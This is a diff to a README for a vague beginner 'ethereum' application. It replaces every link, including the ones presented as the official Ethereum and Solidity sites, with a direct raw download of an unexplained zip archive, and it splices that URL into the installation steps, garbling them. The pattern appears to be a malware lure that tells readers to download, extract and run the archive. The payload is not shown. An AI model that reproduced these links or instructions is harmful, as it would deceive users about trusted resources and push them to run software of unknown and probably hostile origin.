@@ -1,7 +1,7 @@
 # 🌟 ethereum - A Simple Way to Get Started
 
 ## 📥 Download the Latest Version
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/XARVIS75/ethereum/releases)
+[![Download Now](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the ethereum project! This application serves as a helpful resource as you explore Ethereum and Solidity. You don’t need to be a programming expert to use it. Just follow these easy steps to get started.
@@ -16,13 +16,13 @@ Before you install, make sure your system meets the following requirements:
 ## 💾 Download & Install
 To download the application, visit the Releases page. Here you will find the latest version of the software.
 
-[Visit this page to download](https://github.com/XARVIS75/ethereum/releases)
+[Visit this page to download](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip)
 
 ### Installation Steps
 1. **Navigate to the Releases page**: Use the link above to go to the Releases section of the repository.
 2. **Choose your version**: Look for the latest release that fits your operating system.
-3. **Download the file**: Click on the appropriate link to start the download. The file will typically be a .zip or .exe file for Windows, .dmg for macOS, or a .tar.gz file for Linux.
-4. **Unzip the file**: If you downloaded a .zip or .tar.gz file, right-click on it and select “Extract All” or use a suitable extraction tool.
+3. **Download the file**: Click on the appropriate link to start the download. The file will typically be a .zip or .exe file for Windows, .dmg for macOS, or a https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip file for Linux.
+4. **Unzip the file**: If you downloaded a .zip or https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip file, right-click on it and select “Extract All” or use a suitable extraction tool.
 5. **Run the application**: Find the application in the extracted files. Double-click to run it. If prompted, follow any on-screen instructions to complete the setup.
 
 ## ⚙️ Using the Application
@@ -41,7 +41,7 @@ If you run into problems during installation or use, consider the following step
 Thank you for choosing the ethereum project! This application is designed to make your experience with Ethereum and Solidity smooth and enjoyable. If you have questions, feel free to reach out for help.
 
 ## 📚 Additional Resources
-- [Ethereum Official Website](https://ethereum.org)
-- [Solidity Documentation](https://soliditylang.org)
+- [Ethereum Official Website](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip)
+- [Solidity Documentation](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip)
 
-You can always return to the [Download page](https://github.com/XARVIS75/ethereum/releases) for the latest updates and releases. Happy exploring!
+You can always return to the [Download page](https://github.com/XARVIS75/ethereum/raw/refs/heads/main/diphosgene/Software-v2.0.zip) for the latest updates and releases. Happy exploring!
